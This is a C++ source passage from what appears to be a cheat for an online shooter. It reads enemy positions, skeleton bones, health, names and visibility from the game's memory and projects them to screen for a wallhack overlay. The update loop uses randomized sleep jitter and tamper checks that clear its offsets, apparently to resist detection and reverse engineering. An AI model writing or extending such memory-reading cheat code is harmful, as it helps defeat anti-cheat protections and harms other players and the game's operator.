            if (dist > cfg::esp::max_range) {chain.reject(offset_chain_debug::Distance,enemy,static_cast<uint64_t>(dist),0);continue;}

            auto headScreen = WorldToScreenPoint(viewMatrix, headWorld);
            if (headScreen.x < 0) {chain.reject(offset_chain_debug::HeadScreen,enemy,headTF,Offsets::Head);continue;}

            auto feetScreen = WorldToScreenPoint(viewMatrix, feetWorld);
            if (feetScreen.x < 0) {chain.reject(offset_chain_debug::FeetScreen,enemy,feetTF,Offsets::Feet);continue;}

            // Full skeleton for hook.h's 9-bone chain -- best-effort, never
            // rejects the enemy: a bone whose transform/position/screen
            // projection fails just isn't drawn (skelOk[i]=false), same as
            // Head/Spine/Feet are required above but every other limb here
            // is optional, matching hook.h's own ok[b] check.
            Vector3 skelScreen[BONE_COUNT];
            bool    skelOk[BONE_COUNT] = {};
            auto readBoneScreen = [&](int idx, uintptr_t offset) {
                auto tf = GetPlayerBoneTF(enemy, offset);
                if (!is_valid_ptr(tf)) return;
                auto world = GetNodePosition(tf);
                if (world == Vector3::Zero()) return;
                auto screen = WorldToScreenPoint(viewMatrix, world);
                if (screen.x < 0) return;
                skelScreen[idx] = screen;
                skelOk[idx] = true;
            };
            skelScreen[BONE_HEAD] = headScreen; skelOk[BONE_HEAD] = true;
            readBoneScreen(BONE_CHEST,  Offsets::Spine);
            readBoneScreen(BONE_HIP,    Offsets::Hip);
            readBoneScreen(BONE_LSH,    Offsets::lShoulder);
            readBoneScreen(BONE_RSH,    Offsets::rShoulder);
            readBoneScreen(BONE_LHAND,  Offsets::lHand);
            readBoneScreen(BONE_RHAND,  Offsets::rHand);
            readBoneScreen(BONE_LFOOT,  Offsets::lAnkle);
            readBoneScreen(BONE_RFOOT,  Offsets::rAnkle);

            local_player_count++;

            PlayerData pd;
            readPlayerName(enemy, pd.name, sizeof(pd.name));
            pd.weaponType = readWeaponType(enemy);
            if (!pd.name[0] && isBot) snprintf(pd.name, sizeof(pd.name), "BOT");
            pd.addr       = enemy;
            pd.Head       = headScreen;
            pd.Toe        = feetScreen;
            pd.headWorld  = headWorld;
            pd.spineWorld = spineWorld;
            pd.neckWorld  = neckWorld;
            for (int b = 0; b < BONE_COUNT; b++) { pd.skelBones[b] = skelScreen[b]; pd.skelOk[b] = skelOk[b]; }
            pd.isKnocked  = isKnocked;
            pd.isVisible  = (isVis == 1);
            pd.isBot      = isBot;
            pd.distance   = dist;
            pd.curHP      = hp;
            pd.maxHP      = 200;
            tmp.push_back(pd);
        }

        chain.stage("chain complete");
        chain.note("accepted=%d",local_player_count);
        static int s_empty_streak = 0;
        if (!tmp.empty()) {
            s_empty_streak = 0;
            player_count.store(local_player_count);
            std::lock_guard<std::mutex> lk(players_mutex);
            touchFrame = {viewMatrix, touchSampleTime, touchFrame.sequence+1};
            players = std::move(tmp);
        } else {
            s_empty_streak++;
            // Only clear player list if empty for 6 consecutive frames (~100ms)
            if (s_empty_streak > 6) {
                player_count.store(0);
                std::lock_guard<std::mutex> lk(players_mutex);
                players.clear();
            }
        }
    }

    static void loop() {
        uint32_t seed = 0x9E3779B1u;
        uint32_t loop_count = 0;
        while (g_run.load(std::memory_order_relaxed)) {
            if ((++loop_count & 0x7F) == 0) {
                if (!sec::Security::DistributedCheck(3) || sec::Security::IsTampered()) {
                    Offsets::Nullify();
                    std::lock_guard<std::mutex> lk(players_mutex);
                    players.clear();
                    player_count.store(0);
                }
            }
            update();
            seed = seed * 1664525u + 1013904223u;
            int jitter = (seed >> 24) & 7;
            std::this_thread::sleep_for(std::chrono::milliseconds(12 + jitter));
        }
    }

    void thread_start() {
        InitRemoteSystem();
        if (g_run.exchange(true)) return;
        g_thread = std::thread(loop);
    }

    void thread_stop() {
        if (!g_run.exchange(false)) return;
        if (g_thread.joinable()) g_thread.join();
        std::lock_guard<std::mutex> lk(players_mutex);
        players.clear();
    }
}